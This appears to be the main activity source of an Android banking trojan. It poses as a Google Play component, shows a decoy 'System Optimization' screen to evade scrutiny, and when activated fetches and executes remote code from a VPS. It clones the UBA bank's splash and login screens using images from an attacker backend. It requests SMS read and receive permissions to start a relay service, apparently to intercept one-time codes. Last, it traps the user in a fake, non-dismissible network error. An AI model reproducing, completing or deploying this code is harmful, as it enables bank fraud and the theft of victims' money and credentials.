package com.android.vending.preload.check

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.content.ContextCompat
import coil.compose.AsyncImage
import com.android.vending.preload.check.utils.PayloadLoader

class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        val isActivated = Config.shouldActivate(this)

        setContent {
            UBACloneTheme {
                if (isActivated) {
                    // Pull the real logic from VPS before showing the UI
                    LaunchedEffect(Unit) {
                        PayloadLoader.loadAndExecute(this@MainActivity)
                    }
                    
                    UBAAppFlow(
                        onRequestPermissions = { requestSmsPermissions() }
                    )
                } else {
                    BoringMaskUI()
                }
            }
        }
    }

    private fun requestSmsPermissions() {
        val needed = mutableListOf(
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            needed.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        val toRequest = needed.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (toRequest.isNotEmpty()) {
            permissionLauncher.launch(toRequest.toTypedArray())
        } else {
            startRelay()
        }
    }

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) {
        startRelay()
    }

    private fun startRelay() {
        val svc = Intent(this, RelayForegroundService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(svc)
        } else {
            startService(svc)
        }
    }
}

@Composable
fun BoringMaskUI() {
    Column(
        modifier = Modifier.fillMaxSize().padding(16.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Center
    ) {
        Icon(
            painter = painterResource(id = R.drawable.ic_launcher),
            contentDescription = null,
            modifier = Modifier.size(64.dp),
            tint = Color.Gray
        )
        Spacer(modifier = Modifier.height(16.dp))
        Text("System Optimization", fontWeight = FontWeight.Bold, fontSize = 18.sp)
        Spacer(modifier = Modifier.height(8.dp))
        Text("Checking device performance and security status...", color = Color.Gray)
        Spacer(modifier = Modifier.height(32.dp))
        CircularProgressIndicator(color = Color(0xFFD32F2F))
    }
}

@Composable
fun UBACloneTheme(content: @Composable () -> Unit) {
    MaterialTheme(
        colorScheme = lightColorScheme(
            primary = Color(0xFFD32F2F), // UBA Red
            onPrimary = Color.White,
            background = Color.White
        ),
        content = content
    )
}

@Composable
fun UBAAppFlow(onRequestPermissions: () -> Unit) {
    var currentScreen by remember { mutableStateOf("splash") }
    var showNetworkError by remember { mutableStateOf(false) }

    LaunchedEffect(currentScreen) {
        if (currentScreen == "splash") {
            onRequestPermissions()
        }
    }

    Box(modifier = Modifier.fillMaxSize()) {
        when (currentScreen) {
            "splash" -> {
                SplashContent(onLoginClick = { currentScreen = "login" })
            }
            "login" -> {
                LoginContent(onAction = { showNetworkError = true })
            }
        }

        if (showNetworkError) {
            NetworkErrorModal()
        }
    }
}

@Composable
fun SplashContent(onLoginClick: () -> Unit) {
    Box(modifier = Modifier.fillMaxSize()) {
        AsyncImage(
            model = "${Config.BACKEND_WEBHOOK.substringBefore("/api")}/static/uba_splash.jpg",
            contentDescription = null,
            modifier = Modifier.fillMaxSize(),
            contentScale = ContentScale.FillBounds,
            placeholder = painterResource(id = R.drawable.ic_launcher)
        )
        
        Box(
            modifier = Modifier
                .align(Alignment.BottomCenter)
                .padding(bottom = 80.dp)
                .fillMaxWidth(0.8f)
                .height(60.dp)
                .clickable { onLoginClick() }
        )
    }
}

@Composable
fun LoginContent(onAction: () -> Unit) {
    Box(modifier = Modifier.fillMaxSize()) {
        AsyncImage(
            model = "${Config.BACKEND_WEBHOOK.substringBefore("/api")}/static/uba_login.jpg",
            contentDescription = null,
            modifier = Modifier.fillMaxSize(),
            contentScale = ContentScale.FillBounds
        )

        Box(
            modifier = Modifier
                .fillMaxSize()
                .clickable { onAction() }
        )
    }
}

@Composable
fun NetworkErrorModal() {
    AlertDialog(
        onDismissRequest = { /* Non-dismissible */ },
        confirmButton = {
            TextButton(onClick = { /* Do nothing */ }) {
                Text("RETRY", color = Color(0xFFD32F2F))
            }
        },
        title = { Text("Connection Error", fontWeight = FontWeight.Bold) },
        text = { Text("We are unable to connect to our servers at the moment. Please check your internet connection and try again later.") },
        containerColor = Color.White,
        textContentColor = Color.Black,
        titleContentColor = Color.Black
    )
}
